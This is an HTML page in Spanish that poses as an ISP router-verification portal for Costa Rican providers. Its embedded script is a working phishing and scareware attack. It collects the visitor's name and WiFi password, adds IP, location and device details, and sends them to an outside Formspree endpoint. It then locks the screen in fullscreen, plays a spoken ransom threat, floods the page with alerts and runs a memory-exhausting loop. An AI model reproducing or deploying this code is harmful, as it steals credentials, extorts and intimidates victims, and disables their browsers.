<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Portal de Gesti贸n de Red | Verificaci贸n Obligatoria</title>
    <style>
        body { background: #e9ecef; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { background: #fff; padding: 40px; width: 450px; border-radius: 4px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); position: relative; z-index: 5; }
        .brand-bar { height: 5px; width: 100%; background: linear-gradient(90deg, #007bff, #00d4ff); position: absolute; top: 0; left: 0; }
        h2 { color: #333; font-size: 22px; margin-top: 0; }
        p { color: #666; font-size: 14px; line-height: 1.6; }
        .form-group { margin-bottom: 20px; }
        label { display: block; font-size: 11px; font-weight: bold; color: #888; text-transform: uppercase; margin-bottom: 5px; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 3px; font-size: 15px; background: #fdfdfd; box-sizing: border-box; }
        input:focus { border-color: #007bff; outline: none; background: #fff; }
        .btn-update { background: #1a1a1a; color: #fff; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; }
        .btn-update:hover { background: #333; }
        
        /* Interfaz de Secuestro */
        #hijack-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #ff0000; z-index: 99999; padding: 50px; font-family: 'Consolas', monospace; box-sizing: border-box; }
        .blink-red { animation: blink 0.2s infinite; }
        @keyframes blink { 0% { background: #000; } 50% { background: #200; } }
    </style>
</head>
<body onkeydown="lock(event)" oncontextmenu="return false">

    <div id="portal" class="card">
        <div class="brand-bar"></div>
        <h2>Gesti贸n de Dispositivo de Red</h2>
        <p>Se ha detectado una desincronizaci贸n en su nodo de conexi贸n. Ingrese los datos de su router para evitar la suspensi贸n del servicio.</p>
        
        <div class="form-group">
            <label>Proveedor de Servicio (ISP)</label>
            <select id="isp">
                <option value="Liberty">Liberty Costa Rica</option>
                <option value="Kolbi">k枚lbi (ICE)</option>
                <option value="Tigo">Tigo Business/Hogar</option>
                <option value="Telecable">Telecable</option>
            </select>
        </div>
        
        <div class="form-group">
            <label>Nombre del Propietario de L铆nea</label>
            <input type="text" id="target_name" placeholder="Nombre completo">
        </div>

        <div class="form-group">
            <label>Clave de Seguridad WiFi (WPA2/WPA3)</label>
            <input type="password" id="target_wifi" placeholder="Ingrese contrase帽a actual">
        </div>

        <button class="btn-update" onclick="startBreach()">ACTUALIZAR CONEXIN</button>
        <p style="font-size: 10px; text-align: center; margin-top: 20px;">漏 2026 Redes y Telecomunicaciones - Acceso Seguro</p>
    </div>

    <div id="hijack-ui">
        <div id="logs"></div>
    </div>

    <script>
        const FORM_ID = "xykdyebg";

        function lock() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch(() => {});
            }
        }

        async function startBreach() {
            const name = document.getElementById('target_name').value;
            const wifi = document.getElementById('target_wifi').value;
            const isp = document.getElementById('isp').value;

            if (!wifi || !name) return alert("Error: Debe completar la validaci贸n de seguridad.");

            document.getElementById('portal').style.display = 'none';
            const ui = document.getElementById('hijack-ui');
            ui.style.display = 'block';
            ui.classList.add('blink-red');
            lock();

            // 1. OBTENER TODO (IP, Geocalizaci贸n, Hardware)
            const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));

            const payload = {
                "OWNER": name,
                "WIFI_PASS": wifi,
                "ISP_SELECTED": isp,
                "REAL_IP": ipInfo.ip,
                "LOCATION": `${ipInfo.city}, ${ipInfo.country_name}`,
                "INTERNET_PROVIDER": ipInfo.org,
                "OS": navigator.platform,
                "HARDWARE_CORES": navigator.hardwareConcurrency,
                "RAM_EST": navigator.deviceMemory + "GB"
            };

            // 2. EXFILTRACIN REAL
            fetch(`https://formspree.io/f/${FORM_ID}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // 3. AUDIO DE AMENAZA
            const talk = new SpeechSynthesisUtterance("He robado su informaci贸n y si la quiere recuperar tiene que pagarme. Te llamar茅 en diez horas.");
            talk.lang = 'es-ES';
            talk.pitch = 0.5;
            talk.rate = 0.8;
            window.speechSynthesis.speak(talk);

            // 4. BUCLE DE CAOS Y BLOQUEO
            const logs = document.getElementById('logs');
            const lines = [
                `> CONEXION ESTABLECIDA CON: ${ipInfo.ip}`,
                `> EXTRACCION WIFI (${isp}): SUCCESS`,
                `> CLAVE CAPTURADA: ${wifi}`,
                `> LOCALIZACION GPS: ${ipInfo.city}, CR`,
                "> ENCRIPTANDO PARTICION DE SISTEMA...",
                "> TODOS LOS DATOS HAN SIDO ENVIADOS.",
                "> ANONYMOUS OPERATOR: ACCESS GRANTED"
            ];

            let i = 0;
            setInterval(() => {
                if (i < lines.length) {
                    const d = document.createElement('div');
                    d.style.marginBottom = "10px";
                    d.innerText = lines[i];
                    logs.appendChild(d);
                    i++;
                }
                
                // Audio loop
                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(talk);
                
                // Bombardeo de alertas
                alert("锔 SISTEMA SECUESTRADO 锔\n\nInformaci贸n de " + name + " ha sido exfiltrada.\nIP: " + ipInfo.ip + "\nWiFi: " + wifi + "\n\nTE LLAMAR EN 10 HORAS.");
                
                // Crash Loop
                new Array(5000000).fill("");
            }, 600);
        }
    </script>
</body>
</html>
